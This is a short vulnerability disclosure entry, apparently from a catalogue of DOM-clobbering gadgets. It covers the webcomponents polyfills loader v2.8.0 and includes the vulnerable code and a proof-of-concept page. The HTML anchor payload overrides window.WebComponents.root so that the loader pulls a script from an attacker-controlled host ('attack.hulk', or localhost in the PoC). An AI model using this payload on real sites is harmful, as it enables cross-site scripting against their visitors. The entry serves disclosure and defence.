## pollyfill

### Meta

+ Library: polyfills
+ Stars: 1.1K
+ Version: v2.8.0
+ Fingerprint: `window.WebComponents !== 'undefined'`
+ Payload: ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://attack.hulk"></a>```
+ Impact: XSS
+ Status: Reported
+ CVE: N/A
+ Foundby: TheHulk

### Library

https://github.com/webcomponents/polyfills

### Vulnerable Code Snippet

```javascript
  var name = 'webcomponents-loader.js';
  // Feature detect which polyfill needs to be imported.
  var polyfills = [];
  if (
    !(
      'attachShadow' in Element.prototype && 'getRootNode' in Element.prototype
    ) ||
    (window.ShadyDOM && window.ShadyDOM.force)
  ) {
    polyfills.push('sd');
  }
```

```javascript
if (polyfills.length) {
  var url;
  var polyfillFile = 'bundles/webcomponents-' + polyfills.join('-') + '.js';

  // Load it from the right place.
  if (window.WebComponents.root && typeof window.WebComponents.root === 'string' ) {
    url = window.WebComponents.root + polyfillFile;
    if (
      window.trustedTypes &&
      window.trustedTypes.isScriptURL(window.WebComponents.root)
    ) {
      url = policy.createScriptURL(url);
    }
  } 
  ...
  var newScript = document.createElement('script');
  newScript.src = url;
}
```

## PoC

```html
<!--Library-->
<script src="https://unpkg.com/@webcomponents/webcomponentsjs@2.8.0/webcomponents-loader.js"></script>
<script type="module" src="my-element.js"></script>
<my-element></my-element>
<!--Library-->

<!--Payload-->
<a id="ShadyDOM"></a>
<a id="ShadyDOM" name="force"></a>
<a id="WebComponents"></a>
<a id="WebComponents" name="root" href="http://localhost:9999"></a>
<!--Payload-->
```

